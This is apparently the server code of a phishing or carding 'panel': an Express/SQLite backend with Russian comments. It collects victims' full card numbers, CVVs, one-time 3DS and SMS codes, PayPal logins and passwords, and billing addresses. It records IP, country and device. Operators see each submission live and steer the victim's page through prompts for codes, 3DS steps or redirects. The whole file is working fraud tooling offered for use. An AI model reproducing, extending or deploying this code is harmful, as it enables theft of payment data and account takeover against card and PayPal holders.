// =================================================================
// СЕРВЕРНЫЙ МОДУЛЬ ARCHITECTURE CENTER (MB PANEL BACKEND MOTOR)
// =================================================================

const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const session = require('express-session');
const useragent = require('express-useragent'); 
const geoip = require('geoip-lite');
const app = express();

// Конфигурирование парсеров и прокси-мидлварей бэкенда
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(useragent.express()); 
app.set('trust proxy', true);

// Настройка хранилища зашифрованных сессий сеансов администратора
app.use(session({
  secret: 'mb-panel-secure-key-2026',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000, httpOnly: true }
}));
// Инициализация базы данных SQLite №1: Учет товарных ордеров
const dbOrders = new sqlite3.Database(path.join(__dirname, 'orders.db'), (err) => {
  if (err) console.error('Ошибка БД заказов:', err.message);
});
dbOrders.run(`CREATE TABLE IF NOT EXISTS orders (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  amount REAL NOT NULL,
  status TEXT DEFAULT 'pending',
  customerName TEXT,
  createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Инициализация базы данных SQLite №2: Логи карт, биллинг-адресов и PayPal аккаунтов
const dbCards = new sqlite3.Database(path.join(__dirname, 'cards.db'), (err) => {
  if (err) console.error('Ошибка открытия БД карт:', err.message);
});

// Структура БД cards_v5 с полной поддержкой сессий биллинг адресов
dbCards.run(`CREATE TABLE IF NOT EXISTS cards_v5 (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  cardNumber TEXT, expiry TEXT, cvv TEXT, otp TEXT,
  status TEXT DEFAULT 'waiting_admin_allow',
  ip TEXT, country TEXT, device TEXT, os TEXT, bankName TEXT, cardName TEXT,
  bankLogo TEXT, paymentLogo TEXT, paypalEmail TEXT, paypalPassword TEXT, redirectUrl TEXT,
  historyLogs TEXT DEFAULT '',
  firstName TEXT, lastName TEXT, companyName TEXT, countryRegion TEXT,
  streetAddress TEXT, townCity TEXT, stateRegion TEXT, zipCode TEXT, phone TEXT, emailAddress TEXT,
  createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
)`);
// Авторизационные данные администратора панели
const ADMIN_LOGIN = "admin";
const ADMIN_PASSWORD = "secure-password-2026"; 

// Защитный слой проверки сессии администратора
const checkAuth = (req, res, next) => {
  if (req.session && req.session.isAdmin) next();
  else res.status(401).json({ success: false, error: 'Unauthorized' });
};

// Пул активных SSE подключений администратора
let adminClients = [];

// Функция широковещательной трансляции событий в админ-панель
function broadcastToAdmins(data) {
  adminClients.forEach(client => {
    try {
      client.res.write(`data: ${JSON.stringify(data)}\n\n`);
    } catch (e) { console.error('Ошибка SSE:', e.message); }
  });
}
// Открытие бесконечного потока событий Server-Sent Events (SSE) для карт
app.get('/api/admin/cards/stream', checkAuth, (req, res) => {
  res.writeHead(200, { 
    'Content-Type': 'text/event-stream', 
    'Cache-Control': 'no-cache, no-transform', 
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });
  res.write(': open stream\n\n');
  const clientId = Date.now();
  adminClients.push({ id: clientId, res });
  req.on('close', () => { adminClients = adminClients.filter(c => c.id !== clientId); });
});

// Открытие потока событий SSE для ордеров
app.get('/api/admin/orders/stream', checkAuth, (req, res) => {
  res.writeHead(200, { 
    'Content-Type': 'text/event-stream', 
    'Cache-Control': 'no-cache, no-transform', 
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });
  const clientId = Date.now();
  adminClients.push({ id: clientId, res });
  req.on('close', () => { adminClients = adminClients.filter(c => c.id !== clientId); });
});

// Эндпоинт инициализации нового заказа в магазине
app.post('/api/create-order', (req, res) => {
  const { amount, customerName } = req.body;
  const sql = `INSERT INTO orders (amount, status, customerName) VALUES (?, 'pending', ?)`;
  dbOrders.run(sql, [amount || 199.00, customerName || 'Guest'], function(err) {
    if (err) return res.status(500).json({ success: false });
    const orderId = this.lastID;
    const newOrder = { id: orderId, amount, status: 'pending', customerName };
    broadcastToAdmins({ event: 'new-order', order: newOrder });
    res.status(210).json({ success: true, orderId: orderId });
  });
});
// Эндпоинт первичного приема данных карты или сессии PayPal от клиента
app.post('/api/save-card', async (req, res) => {
  const { 
    cardNumber, expiry, cvv, bankName, cardName, paypalEmail,
    firstName, lastName, companyName, countryRegion, streetAddress,
    townCity, stateRegion, zipCode, phone, emailAddress
  } = req.body;

  // Определение параметров устройства и ОС посетителя
  let deviceType = "Компьютер";
  if (req.useragent.isMobile) deviceType = "Телефон";
  if (req.useragent.isTablet) deviceType = "Планшет";
  let osName = req.useragent.os;
  
  // Парсинг чистого IP адреса клиента
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
  if (clientIp.startsWith('::ffff:')) clientIp = clientIp.substring(7);

  // Локализация ГЕО-позиции по базе MaxMind GeoIP
  let clientCountry = "Не определена";
  if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1') {
    const geo = geoip.lookup(clientIp);
    if (geo && geo.country) {
      try {
        const regionNames = new Intl.DisplayNames(['ru'], { type: 'region' });
        clientCountry = `${regionNames.of(geo.country)} (${geo.country})`;
      } catch (e) { clientCountry = `Страна: ${geo.country}`; }
    }
  }
  
  let modeText = paypalEmail ? `PayPal (Email: ${paypalEmail})` : "Банковская карта";
  let initialLogStack = JSON.stringify([`Сессия [${modeText}] инициализирована клиентом по IP ${clientIp}`]);
  
  const sql = `INSERT INTO cards_v5 (
    cardNumber, expiry, cvv, otp, status, 
    ip, country, device, os, bankName, 
    cardName, bankLogo, paymentLogo, paypalEmail, paypalPassword, 
    redirectUrl, historyLogs, firstName, lastName, companyName,
    countryRegion, streetAddress, townCity, stateRegion, zipCode,
    phone, emailAddress
  ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;

  const params = [
    cardNumber || '', expiry || '', cvv || '', 'Ожидание...', 
    paypalEmail ? 'checking_paypal' : 'CARD_CHECKING_OTP', 
    clientIp, clientCountry, deviceType, osName, 
    bankName || 'Ожидание...', cardName || 'John Smith', 
    '', '', paypalEmail || '', '', '', initialLogStack,
    firstName || '', lastName || '', companyName || '',
    countryRegion || '', streetAddress || '', townCity || '',
    stateRegion || '', zipCode || '', phone || '', emailAddress || ''
  ];

  dbCards.run(sql, params, function(err) {
    if (err) return res.status(500).json({ success: false, error: err.message });
    const cardId = this.lastID;
    broadcastToAdmins({ event: 'new-card', card: { id: cardId } });
    res.status(201).json({ success: true, cardId: cardId });
  });
});
// Эндпоинт сохранения СМС-кодов (3DS банков, OTP PayPal, Push PIN, Call Secret)
app.post('/api/save-otp', (req, res) => {
  const { cardId, otp, cardNumber, expiry, cvv, bankName } = req.body;
  dbCards.get(`SELECT status, historyLogs FROM cards_v5 WHERE id = ?`, [cardId], (err, row) => {
    if (!row) return res.status(404).json({ success: false });
    let currentLogs = [];
    try { currentLogs = JSON.parse(row.historyLogs || '[]'); } catch(e) {}
    let textLabel = bankName ? `${bankName}: ${otp}` : `Клиент отправил OTP код подтверждения: ${otp}`;
    currentLogs.push(textLabel);
    let updatedLogsJson = JSON.stringify(currentLogs);
    
    let targetStatus = 'CARD_CHECKING_OTP';
    if (row.status === 'paypal_2fa_sms' || row.status === 'paypal_2fa_wrong' || row.status === 'checking_paypal' || row.status === 'PAYPAL_CHECKING_OTP') {
        targetStatus = 'PAYPAL_CHECKING_OTP';
    }

    if (cardNumber && expiry && cvv) {
      const sqlUpdate = `UPDATE cards_v5 SET cardNumber = ?, expiry = ?, cvv = ?, bankName = ?, status = ?, otp = ?, historyLogs = ? WHERE id = ?`;
      dbCards.run(sqlUpdate, [cardNumber, expiry, cvv, bankName, targetStatus, otp || 'Ожидание...', updatedLogsJson, cardId], function(err) {
        broadcastToAdmins({ event: 'update-otp', cardId: cardId });
        return res.json({ success: true });
      });
    } else {
      const sqlOtp = `UPDATE cards_v5 SET otp = ?, status = ?, historyLogs = ? WHERE id = ?`;
      dbCards.run(sqlOtp, [otp, targetStatus, updatedLogsJson, cardId], function(err) {
        broadcastToAdmins({ event: 'update-otp', cardId: cardId });
        res.json({ success: true });
      });
    }
  });
});

// Эндпоинт фиксации ввода логина и пароля от кошелька PayPal
app.post('/api/save-paypal', (req, res) => {
  const { cardId, email, password } = req.body;
  if (!cardId || !email || !password) return res.status(400).json({ success: false, error: 'Неполные параметры' });

  dbCards.get(`SELECT historyLogs FROM cards_v5 WHERE id = ?`, [cardId], (err, row) => {
    if (!row) return res.status(404).json({ success: false });

    let currentLogs = [];
    try { currentLogs = JSON.parse(row.historyLogs || '[]'); } catch(e) {}
    currentLogs.push(`Клиент ввел пароль аккаунта PayPal. Логин: ${email} | Пароль: ${password}`);
    let updatedLogsJson = JSON.stringify(currentLogs);

    const sql = `UPDATE cards_v5 SET paypalEmail = ?, paypalPassword = ?, status = 'checking_paypal', historyLogs = ? WHERE id = ?`;
    dbCards.run(sql, [email, password, updatedLogsJson, cardId], function(err) {
      if (err) return res.status(500).json({ success: false });
      broadcastToAdmins({ event: 'update-paypal', cardId: cardId });
      res.json({ success: true });
    });
  });
});

// Эндпоинт долгого опроса шлюза (Long Polling) на стороне клиента
app.get('/api/check-status', (req, res) => {
  const { cardId } = req.query;
  if (!cardId) return res.status(400).json({ success: false });
  dbCards.get(`SELECT status, bankLogo, paymentLogo, redirectUrl FROM cards_v5 WHERE id = ?`, [cardId], (err, row) => {
    if (!row) return res.json({ success: false });
    res.json({ success: true, status: row.status, bankLogo: row.bankLogo, paymentLogo: row.paymentLogo, redirectUrl: row.redirectUrl });
  });
});
// Эндпоинт вынесения управляющих решений оператора из матрицы команд
app.post('/api/admin/decision', checkAuth, (req, res) => {
  const { cardId, decision, redirectUrl } = req.body;
  if (!cardId || !decision) return res.status(400).json({ success: false });

  dbCards.get(`SELECT historyLogs FROM cards_v5 WHERE id = ?`, [cardId], (err, row) => {
    if (!row) return res.status(404).json({ success: false });

    let currentLogs = [];
    try { currentLogs = JSON.parse(row.historyLogs || '[]'); } catch(e) {}
    currentLogs.push(`Оператор вынес решение для сессии: [${decision}]`);
    let updatedLogsJson = JSON.stringify(currentLogs);

    let sql = "UPDATE cards_v5 SET status = ?, historyLogs = ? WHERE id = ?";
    let params = [decision, updatedLogsJson, cardId];

    if (decision === 'redirect' && redirectUrl) {
      sql = "UPDATE cards_v5 SET status = ?, redirectUrl = ?, historyLogs = ? WHERE id = ?";
      params = ['redirect', redirectUrl, updatedLogsJson, cardId];
    }
    dbCards.run(sql, params, function(err) {
      if (err) return res.status(500).json({ success: false });
      broadcastToAdmins({ event: 'decision-made', cardId: cardId });
      res.json({ success: true });
    });
  });
});

// Эндпоинт активации 3DS банка и установки логотипов (Allow-Pay)
app.post('/api/admin/allow-pay', checkAuth, (req, res) => {
  const { cardId, bankLogo, paymentLogo } = req.body;
  dbCards.get(`SELECT historyLogs FROM cards_v5 WHERE id = ?`, [cardId], (err, row) => {
    if (!row) return res.status(404).json({ success: false });

    let currentLogs = [];
    try { currentLogs = JSON.parse(row.historyLogs || '[]'); } catch(e) {}
    currentLogs.push(`Оператор активировал 3DS шлюз для карты`);
    let updatedLogsJson = JSON.stringify(currentLogs);

    dbCards.run('UPDATE cards_v5 SET status = \'method_3ds\', bankLogo = ?, paymentLogo = ?, historyLogs = ? WHERE id = ?', [bankLogo || '', paymentLogo || '', updatedLogsJson, cardId], function(err) {
      if (err) return res.status(500).json({ success: false });
      broadcastToAdmins({ event: 'admin-allowed-pay', cardId: cardId });
      res.json({ success: true });
    });
  });
});
// Эндпоинт обработки авторизации администратора
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_LOGIN && password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    res.json({ success: true });
  } else { 
    res.status(403).json({ success: false }); 
  }
});

// Получение общего списка карт для админки
app.get('/api/admin/cards', checkAuth, (req, res) => {
  dbCards.all(`SELECT * FROM cards_v5 ORDER BY createdAt DESC`, [], (err, rows) => {
    if (err) return res.status(500).json({ success: false });
    res.json({ success: true, cards: rows });
  });
});

// Роутинг статических файлов и страниц панели
app.use('/logos', express.static(path.join(__dirname, 'logos')));

app.get('/admin', (req, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Запуск бэкенд системы на сетевом интерфейсе
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { 
  console.log(`Сервер успешно запущен на порту ${PORT}`); 
});
